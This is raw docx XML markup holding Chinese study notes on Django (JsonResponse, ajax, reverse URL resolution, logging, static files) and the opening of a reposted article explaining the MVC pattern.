          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方式五：HttpResponse（"itcast1.0")在返回到额页面中添加字符串内容方式六：HttpResponseJson() 返回的页面中添加字符串内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397C35C6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="734" w:name="2839-1535456318716"/>
      <w:bookmarkEnd w:id="734"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>JsonResponse 创建对象时候接收字典作为参数，返回的对象是一个 json 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D27D1B5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="735" w:name="5978-1535456318716"/>
      <w:bookmarkEnd w:id="735"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>能接收 Json 格式数据的场景，都需要使用 view 的 JsonResponse 对象返回一个 json 格式数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA4F25C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="736" w:name="5274-1535456318717"/>
      <w:bookmarkEnd w:id="736"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ajax 的使用场景，页面局部刷新功能。ajax 接收 Json 格式的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F27295" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="737" w:name="4082-1535456318717"/>
      <w:bookmarkEnd w:id="737"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在返回的应答报文中，可以看到 JsonResponse 应答的 content-Type 内容是 application/json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A1AC8E" w14:textId="1877E905" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="738" w:name="7460-1535456318717"/>
      <w:bookmarkEnd w:id="738"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ajax 实现网页局部刷新功能：ajax 的 get()方法获取请求数据 ajax 的 each()方法遍历输出这些数据</w:t>
      </w:r>
      <w:bookmarkStart w:id="739" w:name="8847-1535456318717"/>
      <w:bookmarkEnd w:id="739"/>
    </w:p>
    <w:p w14:paraId="0A658D8B" w14:textId="2293A822" w:rsidR="001C47AF" w:rsidRPr="001C47AF" w:rsidRDefault="00B96C81"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740" w:name="1629-1535456318717"/>
      <w:bookmarkEnd w:id="740"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>045</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什么是反向解析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F3CBAF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="741" w:name="2087-1535456318717"/>
      <w:bookmarkEnd w:id="741"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用场景：模板中的超链接，视图中的重定向</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D9EFA3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="742" w:name="9651-1535456318717"/>
      <w:bookmarkEnd w:id="742"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用：在定义 url 时为 include 定义 namespace 属性，为 url 定义 name 属性在模板中使用 url 标签：{% url 'namespace_value:name_value'%}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECB0BD2" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="743" w:name="4840-1535456318717"/>
      <w:bookmarkEnd w:id="743"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在视图中使用 reverse 函数：redirect(reverse('namespce_value:name_value’))根据正则表达式动态生成地址，减轻后期维护成本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E913555" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="744" w:name="9794-1535456318717"/>
      <w:bookmarkEnd w:id="744"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意反向解析传参数，主要是在我们的反向解析的规则后面天界了两个参数，两个参数之间使用空格隔开：&lt;a href="{% url 'booktest:fan2' 2 3 %}"&gt;位置参数&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B7C0A4" w14:textId="74D06893" w:rsidR="001C47AF" w:rsidRPr="001C47AF" w:rsidRDefault="00B96C81" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="745" w:name="5016-1535456410376"/>
      <w:bookmarkStart w:id="746" w:name="4219-1535456411375"/>
      <w:bookmarkEnd w:id="745"/>
      <w:bookmarkEnd w:id="746"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>046</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.Django </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>日志管理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B662758" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="747" w:name="1262-1535456412137"/>
      <w:bookmarkEnd w:id="747"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 配置好之后： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19005E05" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="748" w:name="4444-1535456412137"/>
      <w:bookmarkEnd w:id="748"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import logging</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E23B3D1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="749" w:name="6493-1535456412137"/>
      <w:bookmarkEnd w:id="749"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>logger=logging.getLogger( name ) # 为 loggers 中定义的名称</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB63622" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="750" w:name="7775-1535456434398"/>
      <w:bookmarkEnd w:id="750"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>logger.info("some info ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B47B50E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="751" w:name="8169-1535456412137"/>
      <w:bookmarkEnd w:id="751"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>可用函数有：logger.debug() logger.info() logger.warning() logger.error()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F9B9EB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="752" w:name="1994-1535456412137"/>
      <w:bookmarkEnd w:id="752"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django 文件管理：对于 jdango 老说，项目中的 css，js,图片都属于静态文件，我们一般会将静态文件放到一个单独的目录中，以方便管理，在 html 页面调用时，也需要指定静态文件的路径。静态文件可以放在项目根目录下，也可以放在应用的目录下，由于这些静态文件在项目中是通用的，所以推荐放在项目的根目录下。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEC7B6A" w14:textId="722B56BB" w:rsidR="001C47AF" w:rsidRPr="00B96C81" w:rsidRDefault="001C47AF" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="753" w:name="9891-1535456412137"/>
      <w:bookmarkEnd w:id="753"/>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在生产中，只要和静态文件相关的，所有访问，基本上没有 django 什么事，一般都是由 nignx 软件代劳了，为什么？因为 nginx 就是干这个的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4753D2" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="001C47AF" w:rsidRDefault="001C47AF" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="222226"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="222226"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>django的优缺点总结 - Python Web开发面试必备</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01073509" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Django Web开发核心基础知识</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8A4655" w14:textId="40C3AE8A" w:rsidR="001C47AF" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>002</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId230" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rStyle w:val="a9"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django网站开发四件套是如何遵循MVC软件设计模式的?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67E219B9" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django网站开发四件套是如何遵循MVC软件设计模式的?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6801C6EA" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 Yunbo Shi </w:t>
      </w:r>
      <w:hyperlink r:id="rId231" w:history="1">
        <w:r w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-05-02</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2738F0C0" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你要开发一个好的网站或网络应用，你就必需了解经典的软件开发所遵循的MVC 设计模式。Django作为最优秀的基于Python语言的网站开发框架，当然也遵循了这种设计模式。小编我就尝试用比较通俗点的语言给你解释下什么是MVC框架以及Django网站开发是如何遵循这种软件开发设计模式的吧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E78C540" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A33F761" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>什么是MVC模式? 它有什么优点?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A5F086" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MVC即 Model-View-Controller(模型-视图-控制器) 模式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27090592" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2027710E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Model (模型) 简而言之即数据模型。模型不是数据本身（比如数据库里的数据），而是抽象的描述数据的构成和逻辑关系。通常模型包括了数据表的各个字段（比如人的年龄和出生日期）和相互关系（单对单，单对多关系等）。数据库里的表会根据模型的定义来生成创建。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2428F6B6" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>View (视图) 主要用于显示数据，用来展示用户可以看到的内容或提供用户可以输入或操作的界面。数据来源于哪里？当然是数据库啦。那么用户输入的数据给谁? 当然是给控制器啦。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528D68AD" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Controller（控制器）是应用程序中处理用户交互的部分。通常控制器负责从视图读取数据，控制用户输入，并向模型发送数据（比如增加或更新数据表）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F59668" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0997DA4B" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果把MVC比喻成一个粽子，那么View就是最外面一层的绿色玉米叶，是吃货们可以直接看到的。Controller就是中间那层熟糯米，而粽子的核心自然是最里面那一层的肉馅Model模型了。现在大家知道中学和大学数学建模的重要性了吧?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219E1FCD" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
